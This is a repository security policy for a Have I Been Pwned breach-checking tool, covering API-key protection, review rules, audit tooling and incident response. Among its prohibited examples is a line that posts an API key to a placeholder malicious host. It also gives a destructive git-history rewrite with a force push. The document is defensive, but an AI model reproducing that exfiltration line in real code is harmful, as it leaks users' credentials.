# Security Policy

---

## ⚡ Powered by Have I Been Pwned

This tool uses data from **[Have I Been Pwned](https://haveibeenpwned.com)** by Troy Hunt, licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/).

**Prerequisites**: Requires a **[Have I Been Pwned API subscription](https://haveibeenpwned.com/API/Key)** (Pwned 1-4 tier). See [HIBP API documentation](https://haveibeenpwned.com/API/v3) for usage terms and acceptable use policy.

---

## Reporting Security Vulnerabilities

If you discover a security vulnerability in this project, please report it privately:

1. **Do NOT open a public issue**
2. Email the maintainer directly or use GitHub's private vulnerability reporting
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)

## Security Considerations

### API Key Protection

This tool requires a HIBP API key. **NEVER commit your API key to the repository.**

**Safe practices:**
- ✅ Use environment variables: `export HIBP_API_KEY="your-key"`
- ✅ Keep `.gitignore` up to date
- ✅ Use `hibp_config.conf.example` as template
- ❌ Never set API key directly in `hibp_config.conf` if tracked by git

### Protected Files

The following files should NEVER be committed (protected by `.gitignore`):
- `hibp_config.conf` - May contain API key
- `my_emails.txt` - Contains personal email addresses
- `hibp_report_*.txt` - Contains breach data
- `logs/` - May contain sensitive information
- `.last_breach_check` - Breach history

### Code Review Requirements

All pull requests must:
1. Not modify `.gitignore` to expose sensitive files
2. Not add code that logs or transmits API keys
3. Not add code that exfiltrates email addresses or breach data
4. Not introduce dependencies with known vulnerabilities
5. Maintain security best practices

### Prohibited Changes

The following changes will be **rejected**:

❌ **Removing or weakening `.gitignore` entries**
```diff
- hibp_config.conf
- my_emails.txt
- logs/
```

❌ **Logging sensitive data**
```python
# NEVER do this:
print(f"API Key: {api_key}")
logger.info(f"Checking email: {email}")
```

❌ **Transmitting data to unauthorized endpoints**
```python
# NEVER do this:
requests.post("https://malicious-site.com", data={"key": api_key})
```

❌ **Storing credentials in code**
```bash
# NEVER do this:
HIBP_API_KEY="hardcoded-key-here"
```

❌ **Disabling security features**
```bash
# NEVER do this:
REDACT_SENSITIVE=false  # When meant to be true
```

### Secure Contribution Guidelines

**Before submitting a PR:**

1. **Review your changes for sensitive data:**
   ```bash
   git diff | grep -iE "(api.?key|password|token|secret)"
   ```

2. **Verify `.gitignore` is intact:**
   ```bash
   git status --ignored
   ```

3. **Check for hardcoded credentials:**
   ```bash
   grep -r "HIBP_API_KEY=" . --include="*.sh" --include="*.py"
   ```

4. **Run local security check:**
   ```bash
   # Ensure no sensitive files are staged
   git diff --cached --name-only | grep -E "(hibp_config.conf|my_emails.txt|hibp_report)"
   ```

### Dependency Security

**Python dependencies:**
```bash
# Check for vulnerabilities
pip3 install safety
safety check

# Or use pip-audit
pip3 install pip-audit
pip-audit
```

**Update dependencies regularly:**
```bash
pip3 list --outdated
```

### API Usage Security

**Rate Limiting:**
- Respect HIBP API rate limits
- Default delays are set appropriately
- Don't disable rate limiting

**K-Anonymity:**
- Password checks use k-anonymity (only first 5 chars of hash sent)
- Never send full passwords to any API
- Never log full passwords

**HTTPS Only:**
- All API calls use HTTPS
- Certificate verification enabled
- Don't disable SSL verification

### Local Security

**Protect your environment:**
```bash
# Secure your shell RC files
chmod 600 ~/.bashrc
chmod 600 ~/.zshrc

# Secure config files
chmod 600 hibp_config.conf
chmod 600 my_emails.txt

# Secure reports directory
chmod 700 reports/
```

**Don't commit sensitive files:**
```bash
# Check what would be committed
git status

# Verify .gitignore is working
git check-ignore -v hibp_config.conf
git check-ignore -v my_emails.txt
```

## Threat Model

### Threats We Protect Against

1. **Accidental API Key Exposure**
   - `.gitignore` prevents committing sensitive files
   - Environment variables recommended over config files
   - Clear documentation on secure practices

2. **Email Address Leakage**
   - Email lists not committed to repository
   - Email template provided instead
   - Logs can be configured to redact emails

3. **Report Data Exposure**
   - Reports directory in `.gitignore`
   - Reports contain breach data (privacy sensitive)
   - Local storage only, not committed

4. **Malicious Code Injection**
   - Code review required for all PRs
   - Maintainer approval required
   - Protected branch rules (see below)

### Threats Outside Scope

- Compromise of HIBP API itself
- Compromise of user's local system
- Social engineering attacks
- Physical access to user's computer

## GitHub Security Settings

### Recommended Settings (Repository Owner)

**Branch Protection Rules for `main` branch:**

1. **Enable: Require pull request reviews before merging**
   - Require 1 approval
   - Dismiss stale PR approvals

2. **Enable: Require status checks to pass**
   - If CI/CD configured

3. **Enable: Require conversation resolution before merging**
   - All review comments must be resolved

4. **Enable: Restrict who can push to matching branches**
   - Only maintainers

5. **Enable: Do not allow bypassing the above settings**

**Repository Settings:**

- ✅ Enable vulnerability alerts (Dependabot)
- ✅ Enable automated security fixes
- ✅ Disable wiki (if not used)
- ✅ Disable issues (if not used, or moderate carefully)
- ✅ Enable private vulnerability reporting

### Setting Up Branch Protection

```bash
# View current branch protection
gh api repos/greogory/hibp-checker/branches/main/protection

# Enable branch protection (manual via GitHub web UI recommended)
# Go to: Settings > Branches > Add rule
# Branch name pattern: main
# Enable options listed above
```

## Security Checklist for Contributors

Before submitting a PR, verify:

- [ ] No API keys or tokens in code
- [ ] No hardcoded email addresses (except examples)
- [ ] No sensitive data in commit messages
- [ ] `.gitignore` not modified to expose sensitive files
- [ ] No new external API calls without discussion
- [ ] Dependencies checked for vulnerabilities
- [ ] Code doesn't log sensitive information
- [ ] Documentation updated if security-relevant changes
- [ ] Tests pass (if applicable)
- [ ] Follows existing code style

## Security Checklist for Maintainers

When reviewing PRs:

- [ ] Verify no sensitive data committed
- [ ] Check for malicious code patterns
- [ ] Review all file modifications carefully
- [ ] Verify `.gitignore` changes (if any)
- [ ] Check for data exfiltration attempts
- [ ] Review new dependencies
- [ ] Verify error handling doesn't expose secrets
- [ ] Check logging statements for sensitive data
- [ ] Run code locally before merging
- [ ] Verify documentation accuracy

## Security Audit Tools

This project uses the following installed tools for comprehensive security auditing:

### Python Code (76 files)

| Tool | Purpose | Command |
|------|---------|---------|
| **bandit** | Security-focused static analysis | `bandit -r . -x ./snapshots,./venv` |
| **pip-audit** | Python dependency vulnerability scanner | `pip-audit` |
| **ruff** | Fast Python linter (security rules) | `ruff check .` |
| **mypy** | Static type checking | `mypy --ignore-missing-imports .` |
| **pylint** | Code quality and error detection | `pylint --disable=C,R *.py` |

### Shell Scripts (44 files)

| Tool | Purpose | Command |
|------|---------|---------|
| **shellcheck** | Static analysis for shell scripts | `shellcheck bin/*.sh scripts/*.sh` |
| **shfmt** | Shell script formatting validation | `shfmt -d bin/*.sh` |

### Docker/Container (4 Dockerfiles)

| Tool | Purpose | Command |
|------|---------|---------|
| **hadolint** | Dockerfile linter | `hadolint Dockerfile` |
| **trivy** | Container vulnerability scanner | `trivy image <image-name>` |
| **grype** | Container/filesystem vulnerability scanner | `grype dir:.` |

### Configuration Files (40 YAML files)

| Tool | Purpose | Command |
|------|---------|---------|
| **yamllint** | YAML linting | `yamllint .github/workflows/` |

### Documentation

| Tool | Purpose | Command |
|------|---------|---------|
| **markdownlint** | Markdown linting | `markdownlint '**/*.md'` |
| **codespell** | Spell checking for typos | `codespell --skip='.git,.snapshots,venv'` |

### GitHub Security Features

| Feature | Status | Purpose |
|---------|--------|---------|
| **Dependabot alerts** | ✅ Enabled | Monitor dependencies for vulnerabilities |
| **Dependabot updates** | ✅ Enabled | Auto-create PRs for security fixes |
| **CodeQL analysis** | ✅ Enabled | Deep semantic code analysis |
| **Secret scanning** | ✅ Enabled | Detect committed secrets |

### Running a Full Security Audit

```bash
# Python security
bandit -r . -x ./snapshots,./venv -f txt
pip-audit --desc

# Shell scripts
find . -name "*.sh" -not -path "./snapshots/*" -exec shellcheck {} \;

# Docker
hadolint Dockerfile

# Dependencies
grype dir:. --only-fixed

# CodeQL (via GitHub Actions)
gh api repos/greogory/hibp-checker/code-scanning/alerts --jq '.[].rule.id'

# Secrets scan
grep -rE "(api[_-]?key|password|secret|token).*=" --include="*.py" --include="*.sh" . | grep -v "example\|template\|\.git"
```

---

## Automated Security Checks

### GitHub Actions (Recommended)

Create `.github/workflows/security.yml`:

```yaml
name: Security Checks

on: [pull_request, push]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Check for secrets
        run: |
          # Check for potential API keys in code
          ! git diff --cached | grep -iE "api.?key.*=.*['\"][a-f0-9]{32}"

      - name: Verify .gitignore
        run: |
          grep -q "hibp_config.conf" .gitignore
          grep -q "my_emails.txt" .gitignore
          grep -q "hibp_report_" .gitignore

      - name: Python security check
        run: |
          pip install safety
          safety check
```

### Pre-commit Hooks (Local)

Create `.git/hooks/pre-commit`:

```bash
#!/bin/bash
# Prevent committing sensitive files

SENSITIVE_FILES=(
    "hibp_config.conf"
    "my_emails.txt"
)

for file in "${SENSITIVE_FILES[@]}"; do
    if git diff --cached --name-only | grep -q "^$file$"; then
        echo "ERROR: Attempting to commit sensitive file: $file"
        echo "Remove with: git reset HEAD $file"
        exit 1
    fi
done

# Check for API keys in staged files
if git diff --cached | grep -iE "HIBP_API_KEY.*=.*['\"][a-f0-9]{32}"; then
    echo "ERROR: API key detected in staged changes"
    exit 1
fi

exit 0
```

Make it executable:
```bash
chmod +x .git/hooks/pre-commit
```

## Incident Response

If a security incident occurs:

1. **Immediate Actions:**
   - Revoke compromised API key
   - Remove sensitive data from git history
   - Notify affected users

2. **Investigation:**
   - Determine scope of exposure
   - Identify how breach occurred
   - Document timeline

3. **Remediation:**
   - Fix vulnerability
   - Update security measures
   - Review similar potential issues

4. **Communication:**
   - Notify users (if applicable)
   - Update security documentation
   - Publish incident report

## Removing Sensitive Data from Git History

If you accidentally commit sensitive data:

```bash
# Remove a file from all history (destructive!)
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch hibp_config.conf" \
  --prune-empty --tag-name-filter cat -- --all

# Or use BFG Repo-Cleaner (faster, recommended)
bfg --delete-files hibp_config.conf

# Force push (only if you're sure!)
git push --force --all
```

**Then:**
1. Immediately revoke the exposed API key
2. Generate a new API key
3. Update your environment variable

## Regular Security Maintenance

### Monthly
- [ ] Review dependencies for updates
- [ ] Check for security advisories
- [ ] Review access logs (if available)

### Quarterly
- [ ] Full security audit of codebase
- [ ] Review and update `.gitignore`
- [ ] Review branch protection rules
- [ ] Test backup and recovery procedures

### Annually
- [ ] Comprehensive security review
- [ ] Update security documentation
- [ ] Review threat model
- [ ] Penetration testing (if applicable)

## Contact

For security concerns, contact the maintainer through GitHub.

---

**Last Updated:** 2025-11-07
**Version:** 1.0
